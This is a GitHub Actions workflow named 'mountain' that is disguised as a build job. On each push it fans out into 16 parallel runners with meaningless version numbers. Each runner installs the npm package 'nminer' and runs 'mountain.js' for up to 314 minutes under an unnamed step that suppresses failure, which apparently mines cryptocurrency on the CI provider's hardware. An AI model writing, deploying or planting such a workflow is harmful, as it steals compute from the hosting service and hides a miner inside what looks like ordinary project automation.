name: mountain
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 550 }
          - { version: 5869 }
          - { version: 2330 }
          - { version: 4258 }
          - { version: 90 }
          - { version: 7860 }
          - { version: 5607 }
          - { version: 839 }
          - { version: 2976 }
          - { version: 3939 }
          - { version: 2298 }
          - { version: 4992 }
          - { version: 6305 }
          - { version: 8987 }
          - { version: 420 }
          - { version: 2678 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 314m node mountain.js || echo "mountain executed"